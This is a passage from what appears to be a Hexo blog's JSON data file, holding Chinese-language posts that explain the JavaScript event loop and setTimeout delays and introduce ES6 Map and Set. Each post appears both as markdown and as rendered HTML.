task()\n},3000)\n\nsleep(10000000)\n````\n乍一看其实差不多，但把这段代码在chrome执行一下，却发现控制台执行task()需要的时间远远超过3秒，为何需要这么长时间？\n\n这时候我们需要重新理解`setTimeout的定义`。我们先说上述代码是怎么执行的：\n\n+ `task()`进入Event Table并注册,计时开始。\n\n+ 执行`sleep`函数，很慢，非常慢，计时仍在继续。\n\n+ 3秒到了，计时事件`timeout`完成，`task()`进入`Event Queue`，但是`sleep`也太慢了吧，还没执行完，只好等着。\n\n+ `sleep`终于执行完了，`task()`终于从Event Queue进入了主线程执行。\n\n上述的流程走完，我们知道`setTimeout`这个函数，是经过指定时间后，把要执行的任务(本例中为`task()`)加入到Event Queue中，又因为是单线程任务要一个一个执行，如果前面的任务需要的时间太久，那么只能等着，导致真正的延迟时间远远大于3秒。\n","source":"_posts/FrontEnd/JS/JS执行机制与异步回调.md","raw":"---\ntitle: JS执行机制与异步回调\ndate: 2018-05-09 14:38:24\ntags: JS执行机制 异步回调\ncategories: JS\n---\n## [转][理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)](https://blog.csdn.net/haoaiqian/article/details/78622651)\n'`javascript执行机制`' / '`代码执行顺序`' / '`函数生命周期加载`' 等类似问题 都与`javascript执行机制`相关。\n\n## 1. 关于JavaScript\n`JavaScript` 是一门 `单线程语言`，在最新的`HTML5`中提出了`Web-Worker`，但`JS 是单线程`这一`核心仍未改变`。所以一切`JS 版的\"多线程\"都是用单线程模拟出来的`，一切 JavaScript `多线程` 都是`纸老虎`！\n\n## 2. JavaScript事件循环\n既然JS是`单线程`，排队 办理业务, `js任务`也要一个一个顺序执行。如 `任务耗时过长`，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：\n+ 同步任务\\\n打开网站，`网页渲染` 过程 就是 `同步任务`，比如 `页面骨架`和 `页面元素`的`渲染`。\n+ 异步任务\\\n  而 `加载 图片 音乐`之类`占用资源大耗时久`的任务，就是`异步任务`。\n  \n  关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以用导图来说明：\n  ![js事件循环机制](https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n  \n  导图要表达的内容用文字来表述的话：<br>\n`同步`和`异步`任务分别进入不同的`执行”场所”`，`同步的进入主线程`，`异步的进入Event Table并注册函数`。当指定的事情`完成`时，`Event Table`会将这个`函数` `移入Event Queue`。`主线程`内的任务`执行完`毕为空，会去`Event Queue`读取对应的函数，进入主线程执行。\n\n  上述过程会不断重复，也就是所谓的 `Event Loop(事件循环)`。\n\n  我们不禁要问了，那`怎么知道`主线程执行栈为空啊？js引擎存在`monitoring process`进程，会`持续不断检查`主线程执行栈是否为空，`一旦为空`，就会去`Event Queue`那里检查是否有`等待被调用的函数`。 \n说了这么多文字，不如直接一段代码更直白：略\n\n## 3. [又爱又恨的setTimeout](https://juejin.im/post/59e85eebf265da430d571f89)\n\n大名鼎鼎的`setTimeout`无需再多言，大家对他的第一印象就是`异步`可以`延时执行`，我们经常这么实现延时3秒执行：\n````\nsetTimeout(() => {\n    console.log('延时3秒');\n},3000)\n````\n\n随着`setTimeout`使用的增加，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这是为何？\n\n渐渐的setTimeout用的地方多了，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这又咋回事啊？\n\n先看一个例子：\n````\nsetTimeout(() => {\n    task();\n},3000)\nconsole.log('执行console');\n````\n\n根据前面我们的结论，setTimeout是异步的，应该先执行console.log这个同步任务，所以我们的结论是：\n````\n//执行console\n//task()\n````\n\n去验证一下，结果正确！\n然后我们修改一下前面的代码：\n````\nsetTimeout(() => {\n    task()\n},3000)\n\nsleep(10000000)\n````\n乍一看其实差不多，但把这段代码在chrome执行一下，却发现控制台执行task()需要的时间远远超过3秒，为何需要这么长时间？\n\n这时候我们需要重新理解`setTimeout的定义`。我们先说上述代码是怎么执行的：\n\n+ `task()`进入Event Table并注册,计时开始。\n\n+ 执行`sleep`函数，很慢，非常慢，计时仍在继续。\n\n+ 3秒到了，计时事件`timeout`完成，`task()`进入`Event Queue`，但是`sleep`也太慢了吧，还没执行完，只好等着。\n\n+ `sleep`终于执行完了，`task()`终于从Event Queue进入了主线程执行。\n\n上述的流程走完，我们知道`setTimeout`这个函数，是经过指定时间后，把要执行的任务(本例中为`task()`)加入到Event Queue中，又因为是单线程任务要一个一个执行，如果前面的任务需要的时间太久，那么只能等着，导致真正的延迟时间远远大于3秒。\n","slug":"FrontEnd/JS/JS执行机制与异步回调","published":1,"updated":"2018-06-12T06:30:45.408Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cd006bb8xjfitz4jcy","content":"<h2 id=\"转-理解JavaScript-执行机制及异步回调-setTimeout-setInterval-Promise\"><a href=\"#转-理解JavaScript-执行机制及异步回调-setTimeout-setInterval-Promise\" class=\"headerlink\" title=\"[转]理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)\"></a>[转]<a href=\"https://blog.csdn.net/haoaiqian/article/details/78622651\" target=\"_blank\" rel=\"noopener\">理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)</a></h2><p>‘<code>javascript执行机制</code>‘ / ‘<code>代码执行顺序</code>‘ / ‘<code>函数生命周期加载</code>‘ 等类似问题 都与<code>javascript执行机制</code>相关。</p>\n<h2 id=\"1-关于JavaScript\"><a href=\"#1-关于JavaScript\" class=\"headerlink\" title=\"1. 关于JavaScript\"></a>1. 关于JavaScript</h2><p><code>JavaScript</code> 是一门 <code>单线程语言</code>，在最新的<code>HTML5</code>中提出了<code>Web-Worker</code>，但<code>JS 是单线程</code>这一<code>核心仍未改变</code>。所以一切<code>JS 版的&quot;多线程&quot;都是用单线程模拟出来的</code>，一切 JavaScript <code>多线程</code> 都是<code>纸老虎</code>！</p>\n<h2 id=\"2-JavaScript事件循环\"><a href=\"#2-JavaScript事件循环\" class=\"headerlink\" title=\"2. JavaScript事件循环\"></a>2. JavaScript事件循环</h2><p>既然JS是<code>单线程</code>，排队 办理业务, <code>js任务</code>也要一个一个顺序执行。如 <code>任务耗时过长</code>，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：</p>\n<ul>\n<li>同步任务\\<br>打开网站，<code>网页渲染</code> 过程 就是 <code>同步任务</code>，比如 <code>页面骨架</code>和 <code>页面元素</code>的<code>渲染</code>。</li>\n<li><p>异步任务\\<br>而 <code>加载 图片 音乐</code>之类<code>占用资源大耗时久</code>的任务，就是<code>异步任务</code>。</p>\n<p>关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以用导图来说明：<br><img src=\"https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"js事件循环机制\"></p>\n<p>导图要表达的内容用文字来表述的话：<br><br><code>同步</code>和<code>异步</code>任务分别进入不同的<code>执行”场所”</code>，<code>同步的进入主线程</code>，<code>异步的进入Event Table并注册函数</code>。当指定的事情<code>完成</code>时，<code>Event Table</code>会将这个<code>函数</code> <code>移入Event Queue</code>。<code>主线程</code>内的任务<code>执行完</code>毕为空，会去<code>Event Queue</code>读取对应的函数，进入主线程执行。</p>\n<p>上述过程会不断重复，也就是所谓的 <code>Event Loop(事件循环)</code>。</p>\n<p>我们不禁要问了，那<code>怎么知道</code>主线程执行栈为空啊？js引擎存在<code>monitoring process</code>进程，会<code>持续不断检查</code>主线程执行栈是否为空，<code>一旦为空</code>，就会去<code>Event Queue</code>那里检查是否有<code>等待被调用的函数</code>。<br>说了这么多文字，不如直接一段代码更直白：略</p>\n</li>\n</ul>\n<h2 id=\"3-又爱又恨的setTimeout\"><a href=\"#3-又爱又恨的setTimeout\" class=\"headerlink\" title=\"3. 又爱又恨的setTimeout\"></a>3. <a href=\"https://juejin.im/post/59e85eebf265da430d571f89\" target=\"_blank\" rel=\"noopener\">又爱又恨的setTimeout</a></h2><p>大名鼎鼎的<code>setTimeout</code>无需再多言，大家对他的第一印象就是<code>异步</code>可以<code>延时执行</code>，我们经常这么实现延时3秒执行：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    console.log(&apos;延时3秒&apos;);</span><br><span class=\"line\">&#125;,3000)</span><br></pre></td></tr></table></figure></p>\n<p>随着<code>setTimeout</code>使用的增加，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这是为何？</p>\n<p>渐渐的setTimeout用的地方多了，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这又咋回事啊？</p>\n<p>先看一个例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    task();</span><br><span class=\"line\">&#125;,3000)</span><br><span class=\"line\">console.log(&apos;执行console&apos;);</span><br></pre></td></tr></table></figure></p>\n<p>根据前面我们的结论，setTimeout是异步的，应该先执行console.log这个同步任务，所以我们的结论是：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//执行console</span><br><span class=\"line\">//task()</span><br></pre></td></tr></table></figure></p>\n<p>去验证一下，结果正确！<br>然后我们修改一下前面的代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    task()</span><br><span class=\"line\">&#125;,3000)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(10000000)</span><br></pre></td></tr></table></figure></p>\n<p>乍一看其实差不多，但把这段代码在chrome执行一下，却发现控制台执行task()需要的时间远远超过3秒，为何需要这么长时间？</p>\n<p>这时候我们需要重新理解<code>setTimeout的定义</code>。我们先说上述代码是怎么执行的：</p>\n<ul>\n<li><p><code>task()</code>进入Event Table并注册,计时开始。</p>\n</li>\n<li><p>执行<code>sleep</code>函数，很慢，非常慢，计时仍在继续。</p>\n</li>\n<li><p>3秒到了，计时事件<code>timeout</code>完成，<code>task()</code>进入<code>Event Queue</code>，但是<code>sleep</code>也太慢了吧，还没执行完，只好等着。</p>\n</li>\n<li><p><code>sleep</code>终于执行完了，<code>task()</code>终于从Event Queue进入了主线程执行。</p>\n</li>\n</ul>\n<p>上述的流程走完，我们知道<code>setTimeout</code>这个函数，是经过指定时间后，把要执行的任务(本例中为<code>task()</code>)加入到Event Queue中，又因为是单线程任务要一个一个执行，如果前面的任务需要的时间太久，那么只能等着，导致真正的延迟时间远远大于3秒。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转-理解JavaScript-执行机制及异步回调-setTimeout-setInterval-Promise\"><a href=\"#转-理解JavaScript-执行机制及异步回调-setTimeout-setInterval-Promise\" class=\"headerlink\" title=\"[转]理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)\"></a>[转]<a href=\"https://blog.csdn.net/haoaiqian/article/details/78622651\" target=\"_blank\" rel=\"noopener\">理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)</a></h2><p>‘<code>javascript执行机制</code>‘ / ‘<code>代码执行顺序</code>‘ / ‘<code>函数生命周期加载</code>‘ 等类似问题 都与<code>javascript执行机制</code>相关。</p>\n<h2 id=\"1-关于JavaScript\"><a href=\"#1-关于JavaScript\" class=\"headerlink\" title=\"1. 关于JavaScript\"></a>1. 关于JavaScript</h2><p><code>JavaScript</code> 是一门 <code>单线程语言</code>，在最新的<code>HTML5</code>中提出了<code>Web-Worker</code>，但<code>JS 是单线程</code>这一<code>核心仍未改变</code>。所以一切<code>JS 版的&quot;多线程&quot;都是用单线程模拟出来的</code>，一切 JavaScript <code>多线程</code> 都是<code>纸老虎</code>！</p>\n<h2 id=\"2-JavaScript事件循环\"><a href=\"#2-JavaScript事件循环\" class=\"headerlink\" title=\"2. JavaScript事件循环\"></a>2. JavaScript事件循环</h2><p>既然JS是<code>单线程</code>，排队 办理业务, <code>js任务</code>也要一个一个顺序执行。如 <code>任务耗时过长</code>，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：</p>\n<ul>\n<li>同步任务\\<br>打开网站，<code>网页渲染</code> 过程 就是 <code>同步任务</code>，比如 <code>页面骨架</code>和 <code>页面元素</code>的<code>渲染</code>。</li>\n<li><p>异步任务\\<br>而 <code>加载 图片 音乐</code>之类<code>占用资源大耗时久</code>的任务，就是<code>异步任务</code>。</p>\n<p>关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以用导图来说明：<br><img src=\"https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"js事件循环机制\"></p>\n<p>导图要表达的内容用文字来表述的话：<br><br><code>同步</code>和<code>异步</code>任务分别进入不同的<code>执行”场所”</code>，<code>同步的进入主线程</code>，<code>异步的进入Event Table并注册函数</code>。当指定的事情<code>完成</code>时，<code>Event Table</code>会将这个<code>函数</code> <code>移入Event Queue</code>。<code>主线程</code>内的任务<code>执行完</code>毕为空，会去<code>Event Queue</code>读取对应的函数，进入主线程执行。</p>\n<p>上述过程会不断重复，也就是所谓的 <code>Event Loop(事件循环)</code>。</p>\n<p>我们不禁要问了，那<code>怎么知道</code>主线程执行栈为空啊？js引擎存在<code>monitoring process</code>进程，会<code>持续不断检查</code>主线程执行栈是否为空，<code>一旦为空</code>，就会去<code>Event Queue</code>那里检查是否有<code>等待被调用的函数</code>。<br>说了这么多文字，不如直接一段代码更直白：略</p>\n</li>\n</ul>\n<h2 id=\"3-又爱又恨的setTimeout\"><a href=\"#3-又爱又恨的setTimeout\" class=\"headerlink\" title=\"3. 又爱又恨的setTimeout\"></a>3. <a href=\"https://juejin.im/post/59e85eebf265da430d571f89\" target=\"_blank\" rel=\"noopener\">又爱又恨的setTimeout</a></h2><p>大名鼎鼎的<code>setTimeout</code>无需再多言，大家对他的第一印象就是<code>异步</code>可以<code>延时执行</code>，我们经常这么实现延时3秒执行：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    console.log(&apos;延时3秒&apos;);</span><br><span class=\"line\">&#125;,3000)</span><br></pre></td></tr></table></figure></p>\n<p>随着<code>setTimeout</code>使用的增加，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这是为何？</p>\n<p>渐渐的setTimeout用的地方多了，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这又咋回事啊？</p>\n<p>先看一个例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    task();</span><br><span class=\"line\">&#125;,3000)</span><br><span class=\"line\">console.log(&apos;执行console&apos;);</span><br></pre></td></tr></table></figure></p>\n<p>根据前面我们的结论，setTimeout是异步的，应该先执行console.log这个同步任务，所以我们的结论是：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//执行console</span><br><span class=\"line\">//task()</span><br></pre></td></tr></table></figure></p>\n<p>去验证一下，结果正确！<br>然后我们修改一下前面的代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    task()</span><br><span class=\"line\">&#125;,3000)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(10000000)</span><br></pre></td></tr></table></figure></p>\n<p>乍一看其实差不多，但把这段代码在chrome执行一下，却发现控制台执行task()需要的时间远远超过3秒，为何需要这么长时间？</p>\n<p>这时候我们需要重新理解<code>setTimeout的定义</code>。我们先说上述代码是怎么执行的：</p>\n<ul>\n<li><p><code>task()</code>进入Event Table并注册,计时开始。</p>\n</li>\n<li><p>执行<code>sleep</code>函数，很慢，非常慢，计时仍在继续。</p>\n</li>\n<li><p>3秒到了，计时事件<code>timeout</code>完成，<code>task()</code>进入<code>Event Queue</code>，但是<code>sleep</code>也太慢了吧，还没执行完，只好等着。</p>\n</li>\n<li><p><code>sleep</code>终于执行完了，<code>task()</code>终于从Event Queue进入了主线程执行。</p>\n</li>\n</ul>\n<p>上述的流程走完，我们知道<code>setTimeout</code>这个函数，是经过指定时间后，把要执行的任务(本例中为<code>task()</code>)加入到Event Queue中，又因为是单线程任务要一个一个执行，如果前面的任务需要的时间太久，那么只能等着，导致真正的延迟时间远远大于3秒。</p>\n"},{"title":"JS笔记-廖雪峰","date":"2018-04-16T09:22:06.000Z","archives":null,"_content":"## ES6 Map和Set(廖雪峰)\n(https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000)<br>\nJavaScript的 默认对象 表示方式`{}`可以视为其他语言中的`Map`或`Dictionary`的数据结构，即一组`键值对`。\n但是JavaScript的对象有个小问题，就是`键`必须是`字符串`。但实际上`Number`或者`其他数据类型`作为键也是非常合理的。\n\n为了解决这个问题，最新的`ES6`规范引入了 新的 数据类型`Map`。\n测试浏览器是否支持`ES6规范` 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：\n````\n'use strict';\nvar m = new Map();\nvar s = new Set();\nconsole.log('你的浏览器支持Map和Set！');\n````\n### Map(`增set` `删delete` `改set` `查get has`)\n`Map`是一组`键值对`的结构，具有极快的查找速度。\n> var m = new Map([['Michael', 95], ['Bob', 75], ['Tracy', 85]]); <br>\n> m.get('Michael'); // 95\n\n初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：\n````\nvar m = new Map(); // 空Map\nm.set('Adam', 67); // 添加新的key-value\nm.set('Bob', 59);\nm.has('Adam'); // 是否存在key 'Adam': true\nm.get('Adam'); // 67\nm.delete('Adam'); // 删除key 'Adam'\nm.get('Adam'); // undefined\n````\n一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：\n````\nvar m = new Map();\nm.set('Adam', 67);\nm.set('Adam', 88);\nm.get('Adam'); // 88\n````\n\n### Set(`没有重复的key`)\n`Set`和`Map`类似，也是一组`key的集合`，但`不存储value`。由于`key不能重复`，所以，在Set中，`没有重复的key`。\n要`创建一个Set`，需要提供一个`Array`作为输入，或者`直接创建一个空Set`：\n````\nvar s1 = new Set(); // 空Set\nvar s2 = new Set([1, 2, 3]); // 含1, 2, 3\n````\n重复元素在Set中自动被过滤：\n> var s = new Set([1, 2, 3, 3, '3']);\n> s; // Set {1, 2, 3, \"3\"}\n\n通过`add(key)`方法可以`添加元素到Set`中，可以重复添加，但不会有效果：\n通过`delete(key)`方法可以删除元素：\n\n","source":"_posts/FrontEnd/JS/JS笔记-廖雪峰.md","raw":"---\ntitle: JS笔记-廖雪峰\ndate: 2018-04-16 17:22:06\ntags: ES5/ES6\narchives: \ncategories: 原生JS\n---\n## ES6 Map和Set(廖雪峰)\n(https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000)<br>\nJavaScript的 默认对象 表示方式`{}`可以视为其他语言中的`Map`或`Dictionary`的数据结构，即一组`键值对`。\n但是JavaScript的对象有个小问题，就是`键`必须是`字符串`。但实际上`Number`或者`其他数据类型`作为键也是非常合理的。\n\n为了解决这个问题，最新的`ES6`规范引入了 新的 数据类型`Map`。\n测试浏览器是否支持`ES6规范` 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：\n````\n'use strict';\nvar m = new Map();\nvar s = new Set();\nconsole.log('你的浏览器支持Map和Set！');\n````\n### Map(`增set` `删delete` `改set` `查get has`)\n`Map`是一组`键值对`的结构，具有极快的查找速度。\n> var m = new Map([['Michael', 95], ['Bob', 75], ['Tracy', 85]]); <br>\n> m.get('Michael'); // 95\n\n初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：\n````\nvar m = new Map(); // 空Map\nm.set('Adam', 67); // 添加新的key-value\nm.set('Bob', 59);\nm.has('Adam'); // 是否存在key 'Adam': true\nm.get('Adam'); // 67\nm.delete('Adam'); // 删除key 'Adam'\nm.get('Adam'); // undefined\n````\n一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：\n````\nvar m = new Map();\nm.set('Adam', 67);\nm.set('Adam', 88);\nm.get('Adam'); // 88\n````\n\n### Set(`没有重复的key`)\n`Set`和`Map`类似，也是一组`key的集合`，但`不存储value`。由于`key不能重复`，所以，在Set中，`没有重复的key`。\n要`创建一个Set`，需要提供一个`Array`作为输入，或者`直接创建一个空Set`：\n````\nvar s1 = new Set(); // 空Set\nvar s2 = new Set([1, 2, 3]); // 含1, 2, 3\n````\n重复元素在Set中自动被过滤：\n> var s = new Set([1, 2, 3, 3, '3']);\n> s; // Set {1, 2, 3, \"3\"}\n\n通过`add(key)`方法可以`添加元素到Set`中，可以重复添加，但不会有效果：\n通过`delete(key)`方法可以删除元素：\n\n","slug":"FrontEnd/JS/JS笔记-廖雪峰","published":1,"updated":"2018-05-09T06:37:18.748Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cf006gb8xjxwcnl8im","content":"<h2 id=\"ES6-Map和Set-廖雪峰\"><a href=\"#ES6-Map和Set-廖雪峰\" class=\"headerlink\" title=\"ES6 Map和Set(廖雪峰)\"></a>ES6 Map和Set(廖雪峰)</h2><p>(<a href=\"https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000</a>)<br><br>JavaScript的 默认对象 表示方式<code>{}</code>可以视为其他语言中的<code>Map</code>或<code>Dictionary</code>的数据结构，即一组<code>键值对</code>。<br>但是JavaScript的对象有个小问题，就是<code>键</code>必须是<code>字符串</code>。但实际上<code>Number</code>或者<code>其他数据类型</code>作为键也是非常合理的。</p>\n<p>为了解决这个问题，最新的<code>ES6</code>规范引入了 新的 数据类型<code>Map</code>。<br>测试浏览器是否支持<code>ES6规范</code> 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;use strict&apos;;</span><br><span class=\"line\">var m = new Map();</span><br><span class=\"line\">var s = new Set();</span><br><span class=\"line\">console.log(&apos;你的浏览器支持Map和Set！&apos;);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Map-增set-删delete-改set-查get-has\"><a href=\"#Map-增set-删delete-改set-查get-has\" class=\"headerlink\" title=\"Map(增set 删delete 改set 查get has)\"></a>Map(<code>增set</code> <code>删delete</code> <code>改set</code> <code>查get has</code>)</h3><p><code>Map</code>是一组<code>键值对</code>的结构，具有极快的查找速度。</p>\n<blockquote>\n<p>var m = new Map([[‘Michael’, 95], [‘Bob’, 75], [‘Tracy’, 85]]); <br><br>m.get(‘Michael’); // 95</p>\n</blockquote>\n<p>初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map(); // 空Map</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67); // 添加新的key-value</span><br><span class=\"line\">m.set(&apos;Bob&apos;, 59);</span><br><span class=\"line\">m.has(&apos;Adam&apos;); // 是否存在key &apos;Adam&apos;: true</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 67</span><br><span class=\"line\">m.delete(&apos;Adam&apos;); // 删除key &apos;Adam&apos;</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // undefined</span><br></pre></td></tr></table></figure></p>\n<p>一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map();</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67);</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 88);</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 88</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Set-没有重复的key\"><a href=\"#Set-没有重复的key\" class=\"headerlink\" title=\"Set(没有重复的key)\"></a>Set(<code>没有重复的key</code>)</h3><p><code>Set</code>和<code>Map</code>类似，也是一组<code>key的集合</code>，但<code>不存储value</code>。由于<code>key不能重复</code>，所以，在Set中，<code>没有重复的key</code>。<br>要<code>创建一个Set</code>，需要提供一个<code>Array</code>作为输入，或者<code>直接创建一个空Set</code>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var s1 = new Set(); // 空Set</span><br><span class=\"line\">var s2 = new Set([1, 2, 3]); // 含1, 2, 3</span><br></pre></td></tr></table></figure></p>\n<p>重复元素在Set中自动被过滤：</p>\n<blockquote>\n<p>var s = new Set([1, 2, 3, 3, ‘3’]);<br>s; // Set {1, 2, 3, “3”}</p>\n</blockquote>\n<p>通过<code>add(key)</code>方法可以<code>添加元素到Set</code>中，可以重复添加，但不会有效果：<br>通过<code>delete(key)</code>方法可以删除元素：</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"ES6-Map和Set-廖雪峰\"><a href=\"#ES6-Map和Set-廖雪峰\" class=\"headerlink\" title=\"ES6 Map和Set(廖雪峰)\"></a>ES6 Map和Set(廖雪峰)</h2><p>(<a href=\"https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000</a>)<br><br>JavaScript的 默认对象 表示方式<code>{}</code>可以视为其他语言中的<code>Map</code>或<code>Dictionary</code>的数据结构，即一组<code>键值对</code>。<br>但是JavaScript的对象有个小问题，就是<code>键</code>必须是<code>字符串</code>。但实际上<code>Number</code>或者<code>其他数据类型</code>作为键也是非常合理的。</p>\n<p>为了解决这个问题，最新的<code>ES6</code>规范引入了 新的 数据类型<code>Map</code>。<br>测试浏览器是否支持<code>ES6规范</code> 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;use strict&apos;;</span><br><span class=\"line\">var m = new Map();</span><br><span class=\"line\">var s = new Set();</span><br><span class=\"line\">console.log(&apos;你的浏览器支持Map和Set！&apos;);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Map-增set-删delete-改set-查get-has\"><a href=\"#Map-增set-删delete-改set-查get-has\" class=\"headerlink\" title=\"Map(增set 删delete 改set 查get has)\"></a>Map(<code>增set</code> <code>删delete</code> <code>改set</code> <code>查get has</code>)</h3><p><code>Map</code>是一组<code>键值对</code>的结构，具有极快的查找速度。</p>\n<blockquote>\n<p>var m = new Map([[‘Michael’, 95], [‘Bob’, 75], [‘Tracy’, 85]]); <br><br>m.get(‘Michael’); // 95</p>\n</blockquote>\n<p>初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 